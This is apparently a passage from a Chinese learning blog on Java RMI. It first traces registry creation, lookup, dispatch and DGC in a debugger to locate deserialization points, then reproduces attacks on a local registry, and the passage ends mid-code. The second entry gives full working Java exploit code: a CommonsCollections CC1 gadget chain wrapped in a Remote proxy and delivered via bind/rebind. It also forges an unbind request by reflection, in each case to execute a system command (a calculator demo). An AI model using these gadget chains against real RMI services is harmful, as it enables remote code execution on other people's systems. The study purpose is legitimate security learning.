<p>然后进入到<code>createRegistry()</code>-&gt;<code>RegistryImpl()</code>，这里传入端口号1099</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323153939.png" ></p>
<p>再跟进，中间有些别的代码是些安全检查，我们一直看到136行，这里新建了一个我们很熟悉的LiveRef和一个UnicastServerRef</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323154223.png" ></p>
<p>和之前创建远程服务端流程很像，我们跟进到里面的setup看一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323154428.png" ></p>
<p>里面也是用到exportObject()，对比一下之前创建远程对象的exportObject()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323154746.png" ></p>
<p>对比一下他们的参数，主要区别就是第三个参数，服务端是false，注册端是true，描述是permanent，很好理解，这代表我们注册端注册的服务是一个永久对象，服务端的服务是一个临时对象</p>
<p>继续跟进，也是来到创建stub的地方，但是这个和之前服务端的创建就不一样，进入到createProxy()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323155134.png" ></p>
<p>这次这里的判断就比较重要，我们跟进<code>stubClassExists()</code>判断</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323155455.png" ></p>
<p>大概逻辑就是看能不能获取到<code>RegistryImpl_Stub</code>这个类，如果有就返回true，没有就false，我们这个版本的java是有<code>RegistryImpl_Stub</code>这个类的，所以返回true，我们会进入到if语句里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323160835.png" ></p>
<p>所以下一步是进入到<code>createStub()</code>里面，跟进看一下</p>
<p>就是通过反射创建这个对象，里面放的是ref</p>
<blockquote>
<p>相比于之前<strong>发布远程对象</strong>中的 Stub，是一个动态代理，里面放的是一个 ref。<br>现在<strong>发布远程对象</strong>是用 forName 创建的，里面放的也是 ref，是一致的。</p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161212.png" ></p>
<p>创建完回去再往下，我们会进入到<code>setSkeleton()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161452.png" ></p>
<p>进去里面有一个<code>createSkeleton()</code>，根据前面的流程图，我们知道skeleton是作为服务端的代理</p>
<p>skeleton是通过forname()的方法创建的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161809.png" ></p>
<p>再往后，又来到target，作用也很前面服务端一样把数据包裹进去</p>
<p>此时看变量情况，ref里面多了skel对象</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161957.png" ></p>
<p>迅速跳过，到下面的<code>exportObject()</code>，流程和前面一样，直到一个<code>super.exportObject(target);</code>跟进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323162210.png" ></p>
<p>有一个<code>ObjectTable.putTarget(target)</code> 又是一次封装</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323162424.png" ></p>
<p>一路赋值完，我们关注一下控制台变量的情况，主要是点开objTable，可以看到有三个target</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323163307.png" ></p>
<p>target@801里面disp和stub里面包的ref是同一个，端口号都是1099，stub是一个RegustryImpl_Stub</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323164614.png" ></p>
<p>target@842里面的stub是$proxy对象的，也可以看到ref详情</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323164752.png" ></p>
<p>再看target@840,里面的stub是一个DGCImpl_Stub，是分布式垃圾回收的一个对象，后面会再接触到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323164928.png" ></p>
<h6 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h6><p>主要是这个bind()方法，比较简单，标注在图里了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-23%2016.57.52.png" ></p>
<h6 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h6><p>注册端创建和服务端创建总体还是差不多的，区别在于一个是持久的一个是临时的，还有stub的判断和创建方式也有些不同。关于为什么最后数据有三个target，且里面stub的类型还不一样，要到后面才能解答。</p>
<h5 id="客户端请求注册中心–客户端"><a href="#客户端请求注册中心–客户端" class="headerlink" title="客户端请求注册中心–客户端"></a>客户端请求注册中心–客户端</h5><p>*这块存在漏洞</p>
<p>三个代码都打断点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323175236.png" ></p>
<p>进入<code>getRegistry()</code>,会看到很多之前熟悉的操作，赋值LiveRef，createProxy等</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323175616.png" ></p>
<p>和之前一样新建一个ref，可以看到ip端口信息都在里面了，这里就算我们获取了注册中心等stub，后面去查找远程对象</p>
<p>代码第二句进来看到很多log相关的语句，无关紧要，跳了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323184407.png" ></p>
<p>直到这个lookup，这里因为java版本对不上，没办法打断点，直接看逻辑吧</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323184440.png" ></p>
<p>此时看到变量情况，会看到有一个<code>param_1=&quot;remoteObj&quot;</code>，这个是传参的var1，这个参数是作为序列化数据传进去的，注册中心后续会通过反序列化读取。</p>
<p>接着有一个<code>supre.ref.invoke(var2)</code>，查看详情可以知道是<code>UnicastRef</code>类，<code>invoke()</code>方法里面有 <code>call.executeCall()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323184904.png" ></p>
<p>在 <code>call.executeCall()</code>里面处理真正的网络请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185112.png" ></p>
<p>进入到<code>call.executeCall()</code>里面有一个<code>readObject()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185217.png" ></p>
<p>看到in变量，不难理解就是数据流的东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185259.png" ></p>
<p>这里处理异常本意是好，但是如果注册中心返回的是一个恶意的流，会导致在这个地方反序列化。这个点更隐蔽，影响面更大，因为所有处理网络请求都会经过这个地方</p>
<p>以上就是客户端和注册中心之间的操作，f8回到主函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185913.png" ></p>
<p>可以看到我们已经获取了remoteObj这个动态代理，里面包含了一个ref</p>
<h5 id="客户端请求服务端–客户端"><a href="#客户端请求服务端–客户端" class="headerlink" title="客户端请求服务端–客户端"></a>客户端请求服务端–客户端</h5><p>这里断点打在第三句</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414142810.png" ></p>
<p>因为此时<code>helloService</code>是一个动态代理类，所以一开始会进入到invoke</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414142931.png" ></p>
<p>重点看到最底下的<code>invokeRemoteMethod</code>方法，跟进去，里面有一个<code>ref.invoke()</code>，是一个重载的方法，里面是用来创建一个连接，具体逻辑如下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414143210.png" ></p>
<p>继续走，有一个<code>marshalValue</code>方法，里面会做一堆判断，然后序列化我们调用远程函数时传进去的参数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414143345.png" ></p>
<p>再继续往前，又遇到<code>call.executeCall()</code>，前文也提到了，RMI执行网络请求的时候就会一定会走到这个地方，是存在危险的</p>
<p>后面就是<code>unmarshalValue()</code>，因为我们传入的参数类型是String，不符合前面一系列判断，这里会进行一次反序列化操作，把数据读回来，这里也是一个攻击点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414143853.png" ></p>
<p>然后一路跟进就走会主函数，代码完成远程函数调用</p>
<h6 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h6><ul>
<li>存在攻击的点，注册中心-&gt;服务端，查找远程对象的时候存在攻击点，具体表现为服务端打客户端，入口类是<code>call.executeCall()</code>，里面再抛出异常的时候存在反序列化点</li>
<li>服务端-&gt;客户端两个攻击点，一个是<code>call.executeCall()</code>，另一个是<code>unmarshalValue()</code></li>
</ul>
<h5 id="注册中心处理客户端请求"><a href="#注册中心处理客户端请求" class="headerlink" title="注册中心处理客户端请求"></a>注册中心处理客户端请求</h5><p>从注册中心角度看客户端请求，主要是处理skel，前面新建注册中心的过程有一个listen()，最后肯定会走到<code>RegistryImpl_Skel</code>里面（具体过程可以回顾白日梦组长的视频）</p>
<p>断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414171358.png" ></p>
<p>RMIServer开启调试模式，RMIClient运行程序，调试会自动跳到这里</p>
<p>看一下此时target里面有一个stub，stub里面的ref指向的是1099端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414212554.png" ></p>
<p>往下走到<code>final Dispatcher disp = target.getDispatcher();</code>，这一步是把<code>skel</code>的值放到disp中</p>
<p>再继续往下有一个<code>disp.dispatch</code>，跟进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414212846.png" ></p>
<p><code>oldDispatch()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414213102.png" ></p>
<p><code>disp.dispatch</code>()-&gt;<code>oldDispatch()</code>-&gt;<code>skel.dispatch()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414213215.png" ></p>
<p>重点是<code>skel.dispatch</code>，这部分源码主要是case，以下这段<a class="link"   href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80" >引自<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>我们与注册中心进行交互可以使用如下几种方式：</p>
<ul>
<li>list</li>
<li>bind</li>
<li>rebind</li>
<li>unbind</li>
<li>lookup</li>
</ul>
<p>这几种方法位于 <code>RegistryImpl_Skel#dispatch</code> 中，也就是我们现在 dispatch 这个方法的地方。</p>
<p>如果存在对传入的对象调用 <code>readObject</code> 方法，则可以利用，<code>dispatch</code> 里面对应关系如下：</p>
<ul>
<li>0-&gt;bind</li>
<li>1-&gt;list</li>
<li>2-&gt;lookup</li>
<li>3-&gt;rebind</li>
<li>4-&gt;unbind</li>
</ul>
<p>只要中间是有反序列化就是可以攻击的，而且我们是从客户端打到注册中心，这其实是黑客们最喜欢的攻击方式。我们来看一看谁可以攻击。</p>
</blockquote>
<p>比如case 0里面有readObject()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414213551.png" ></p>
<p>一圈看下来只有list没有</p>
<h6 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h6><p>客户端请求的时候，注册中心主要就是处理target，完成skel的生成和处理</p>
<p>漏洞点主要在dispatch，多数case里面都有readObject()，方便后续利用</p>
<h5 id="服务端处理客户端请求"><a href="#服务端处理客户端请求" class="headerlink" title="服务端处理客户端请求"></a>服务端处理客户端请求</h5><p>继续走一样的流程，但是这次的target里面stub是<code>$proxy0</code>，和注册中心的流程有些区别</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414215400.png" ></p>
<p>来到这里，因为skel是null，所以不会进入<code>oldDispatch()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414221043.png" ></p>
<p>后面可以看到一个method，参数是我们传入的参数sayhello（要调用的远程函数名）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414221420.png" ></p>
<p>继续往下走，重点是<code>unmarshalValue()</code>，这个部分可以理解成对称。前面客户发送请求的时候，把参数用marshalValue序列化，这里用unmarshalValue反序列化出来，还有其他地方有这样的对应。</p>
<h5 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h5><p>前面创建注册中心的时候有一个<code>DGCImpl_Stub</code>,现在看一下是什么机制</p>
<p>断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414222105.png" ></p>
<p>前面说会把taget放到一个静态表里，相当于日志记录作用，在put之前，我们可以看到变量里面就有这个DGC，而且还存放在static里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414222730.png" ></p>
<p>现在来看DGC是怎么创建的，主要就是这两句，看似没什么操作</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414222105.png" ></p>
<p>但是这里用了静态变量 <strong>调用静态变量会触发类的初始化</strong></p>
<p>看到DGCImpl里面有一个static方法，作用是 class initializer，断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414223156.png" ></p>
<p>后面又有createProxy()，进去里面有一个createstub</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414223318.png" ></p>
<p>这里像注册中心创建远程服务一样，看是否可以获得这个类<code>DGCImpl_Stub</code>，是有的</p>
<p>整个过程就像注册中心创建远程服务，但是目的不一样，这里创建的是用于回收机制的，并且端口随机</p>
<p>DGC有漏洞的地方：看到这个类<code>DGCImpl_Stub</code>本身，里面有clean和dirty方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414224049.png" ></p>
<p><code>DGCImpl_Skel</code>也有</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414224229.png" ></p>
<ul>
<li>DGC是自动创建的一个过程，用于清理内存。客户端和服务端都有攻击点，而且这是自动生成的，只要创建了远程对象就会有DGC服务</li>
</ul>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>【Java反序列化RMI专题-没有人比我更懂RMI】<a class="link"   href="https://www.bilibili.com/video/BV1L3411a7ax?p=10&vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1L3411a7ax?p=10&amp;vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/" >https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>这篇拖了好久好久好久，博客也没有保持更新频率，真是太拖拉了，战线拉太长现在结束了没有心情注意格式和内容正确了，后面有空再修一下吧。学这部分内容相对比较枯燥，总体还是好理解了，算是自己的java基础多添加了一块砖。希望后面赶上进度。</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-RMI几种攻击</title>
    <url>/2025/04/15/Java-RMI%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>全文参考</p>
<p> <a class="link"   href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F" >https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F<i class="fas fa-external-link-alt"></i></a></p>
<p>做一些简单复现，在心里过一遍这个概念</p>
<h4 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h4><p>之前看代码的时候知道<code>RegistryImpl_Skel#dispatch</code>里面有几个方式，对应关系如下</p>
<ul>
<li>0 —– bind</li>
<li>1 —– list</li>
<li>2 —– lookup</li>
<li>3 —– rebind</li>
<li>4 —– unbind</li>
</ul>
<p>分别看下面几个方式</p>
<h5 id="利用list-攻击"><a href="#利用list-攻击" class="headerlink" title="利用list()攻击"></a>利用list()攻击</h5><p>几个case只有list里面没有readObject，所以没什么攻击面，这里只能简单打印出信息</p>
<p>在RMIClient新建代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 针对 Registry 的 list 鸡肋攻击  </span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">// 针对 Registry 的 list 鸡肋攻击  </span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String[] s = Naming.list(&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415211651.png" ></p>
<h5 id="bind-或rebind"><a href="#bind-或rebind" class="headerlink" title="bind()或rebind()"></a>bind()或rebind()</h5><p>看一下源码，可以看到case0也就是bind里面有readObject</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415212100.png" ></p>
<p>case2的rebind也是（不截图了）</p>
<p>这两个地方都存在反序列化点，参数是我们的参数名和远程对象</p>
<p>现在尝试用CC1，CC1最后面是 <code>InvocationHandler.readObject()</code>，现在我们要让客户端的 <code>bind()</code> 方法执行 <code>readObject()</code>。</p>
<blockquote>
<p> RMI注册中心（<code>Registry</code>）的 <code>bind()</code> 方法要求绑定的对象必须是 <strong><code>Remote</code> 接口的实现类或其代理对象</strong>。直接传入普通对象（如 <code>InvocationHandler</code>）会因类型不匹配被拒绝</p>
</blockquote>
<p>这里客户端收到信息是一个proxy对象，让proxy对象被执行的时候去调用readObject，所以我们有一个CC1生成的对象后要给他要一个动态代理的壳，以下是代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1(); <span class="comment">// cc1链生成的对象</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance( <span class="comment">// 套上一个动态代理的壳</span></span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,remote); <span class="comment">// 绑定执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rebind同理，直接修改成<code> registry.rebind(&quot;test&quot;,remote);</code>也能弹计算机</p>
<h5 id="unbind-和lookup"><a href="#unbind-和lookup" class="headerlink" title="unbind()和lookup()"></a>unbind()和lookup()</h5><p>这是lookup()和unbind()源码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415225854.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415225935.png" ></p>
<p>这两个的思路是差不多的，我们看unbind()，unbind()里面只接收string类型的readObject</p>
<p>这里的思路是攻击者模仿<code>RegistryImpl_Stub</code>的流程伪造请求数据，然后网络传输，服务端Skel处理数据，触发反序列化，然后中间涉及反射调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        RemoteObject</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); <span class="comment">// 获取RemoteObject所有成员变量</span></span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>); <span class="comment">// 设置RemoteObject第一个成员变量 也就是 ref</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry); <span class="comment">// 获取ref的值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields(); <span class="comment">// 获取RegistryImpl_Stub所有成员变量</span></span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>); <span class="comment">// 设置第一个RegistryImpl_Stub变量也就是Operation</span></span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry); <span class="comment">// 获取Operation的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        伪造RegistryImpl_Stub里面unbind的代码，去伪造传输信息</span></span><br><span class="line"><span class="comment">//        RemoteCall var2 = super.ref.newCall(this, operations, 4, 4905912898345647071L);</span></span><br><span class="line"><span class="comment">//        ObjectOutput var3 = var2.getOutputStream();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var1);</span></span><br><span class="line"><span class="comment">//        super.ref.invoke(var2);</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">4</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        